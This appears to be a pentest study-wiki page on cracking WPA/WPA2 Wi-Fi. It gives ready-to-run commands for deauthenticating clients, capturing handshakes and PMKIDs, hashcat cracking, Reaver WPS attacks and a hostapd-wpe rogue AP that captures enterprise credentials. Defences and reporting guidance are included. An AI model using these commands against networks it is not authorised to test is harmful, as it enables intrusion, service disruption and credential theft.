---
title: WPA / WPA2 cracking
slug: wpa-and-wpa2-cracking
aliases: [wpa-cracking, wpa2-crack]
---

{% raw %}

> **TL;DR:** WPA-PSK / WPA2-PSK falls offline when you capture either the four-way EAPOL handshake or a PMKID, then guess the PSK with hashcat against a wordlist + rules. Strong passphrases survive; weak ones don't. WPA2-Enterprise (802.1X) is a different attack — see PEAP/MSCHAPv2 below. WPA3-SAE resists offline cracking but transition mode often re-enables WPA2. Companion to [[wifi-and-802-11-primer]] and [[evil-twin-and-karma-attacks]].

## The two capture paths

### Path A — EAPOL 4-way handshake

Requires a client to authenticate (or re-authenticate via deauth).

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
# in another terminal — force a client to re-handshake
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c <client-mac> wlan0mon
```

Look for "WPA handshake: AA:BB:CC:DD:EE:FF" in the airodump status line.

Convert and crack:
```bash
hcxpcapngtool -o hash.22000 cap-01.cap
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

### Path B — PMKID

No client needed. The PMKID is the first PMK-Identifier the AP includes in its first message.

```bash
sudo hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1
# leave running until you see "FOUND PMKID"
hcxpcapngtool -o hash.22000 cap.pcapng
hashcat -m 22000 hash.22000 wordlist.txt
```

PMKID works only on APs that advertise it (newer enterprise often doesn't; many SOHO routers do).

## Wordlists and rules

```bash
# wordlists
ls /usr/share/wordlists/
zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt

# rules expand each candidate with mutations
hashcat ... -r /usr/share/hashcat/rules/best64.rule
hashcat ... -r /usr/share/hashcat/rules/d3ad0ne.rule
hashcat ... -r /usr/share/hashcat/rules/dive.rule

# brute mask for short numerics
hashcat -m 22000 -a 3 hash.22000 ?d?d?d?d?d?d?d?d        # 8-digit numeric
```

## Speed expectations

A consumer GPU (RTX 3060) does ~600 kH/s on `-m 22000`. rockyou.txt (~14M candidates) finishes in ~25s; with `best64` rules the effective space is ~1.5B, ~40 minutes.

For 8-char alphanumeric+symbol brute force: years. WPA2 with a strong PSK is effectively safe offline — the bug is human-chosen short passphrases.

## WPS PIN attacks (Pixie Dust, Reaver)

WPS lets clients join via an 8-digit PIN. Several routers leak the PIN derivation offline via "Pixie Dust"; many others are crackable online via PIN brute (Reaver).

```bash
# Detect WPS-enabled APs
sudo wash -i wlan0mon
# Pixie dust
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv
```

Most modern routers disable WPS or lock it after a few failures. Worth a try on residential targets in PEN-200 scope.

## WPA2-Enterprise (802.1X / EAP)

PSK is replaced by per-user 802.1X. You attack the *authentication exchange*, not the AP's PSK.

EAP-PEAP/MSCHAPv2 attack chain:
1. Stand up a rogue AP with the corporate SSID (`hostapd-wpe`).
2. A client roams to the louder/closer signal.
3. Client offers MSCHAPv2 challenge/response.
4. `hostapd-wpe` logs it.
5. Crack with `asleap` or hashcat `-m 5500`.

```bash
# /etc/hostapd-wpe/hostapd-wpe.conf — set interface and ssid_corp
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# captured creds appear in stdout + /tmp/log
hashcat -m 5500 challenge.hash wordlist.txt
```

Mitigations the *defender* should deploy:
- EAP-TLS (mutual cert auth) instead of PEAP.
- 802.11w-PMF (Protected Management Frames) to prevent deauth.
- Server-cert pinning on clients (so they don't roam to your rogue).

## WPA3-SAE notes

WPA3 personal uses SAE (Dragonfly). Offline-capture-then-crack doesn't work the same way — the handshake binds to a unique element-per-exchange. Active attacks:
- Downgrade via WPA2/WPA3 transition mode.
- Dragonblood (2019): timing/cache side channels in early implementations.
- Forced deauth → reconnect into transition mode → WPA2 capture.

For OSCP/OSEP scope, treat WPA3-only networks as "park this; come back later".

## Defence (so you know what you're up against)

- Long passphrase (≥ 16 chars random or 4-word diceware) — defeats offline brute.
- Disable WPS.
- Disable WPA2-PSK transition mode if you can require WPA3-only.
- Enable 802.11w (PMF) — blocks classic deauth.
- For enterprise: EAP-TLS, server-cert validation, client-cert auth.
- Monitor for rogue APs broadcasting your SSID.

## Reporting findings

For a pentest engagement:
- Capture file (PCAPNG) hashed in evidence.
- Cracked PSK (redacted in the report — show first/last char and length).
- Risk: post-PSK an attacker is on the LAN and reaches anything not protected by 802.1X / VLAN segmentation.
- Recommendation: rotate PSK to ≥16 char random; ideally migrate to WPA3-only or WPA2-Enterprise with EAP-TLS.

## References
- [Aircrack-ng documentation](https://www.aircrack-ng.org/doku.php)
- [Hashcat WPA modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [hcxtools](https://github.com/ZerBea/hcxtools)
- [Vanhoef — KRACK and Dragonblood papers](https://papers.mathyvanhoef.com/)
- See also: [[wifi-and-802-11-primer]], [[evil-twin-and-karma-attacks]], [[password-cracking-toolkit]]

{% endraw %}
